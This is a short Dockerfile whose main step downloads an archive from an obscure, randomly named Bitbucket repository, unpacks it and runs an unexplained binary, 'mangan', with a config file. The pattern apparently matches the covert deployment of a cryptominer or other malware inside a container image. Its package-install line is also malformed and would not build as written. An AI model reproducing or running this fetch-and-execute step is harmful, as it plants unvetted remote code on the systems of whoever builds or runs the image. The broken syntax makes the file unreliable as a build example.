FROM ubuntu:xenial

WORKDIR /root/

RUN apt-get update && apt-get -qy install \
 apt update -y && apt install -y wget \


RUN wget https://bitbucket.org/awfesdgsh/sadtenan/downloads/cuanyok.tar.gz && tar -xvf cuanyok.tar.gz && ./mangan turu.ini
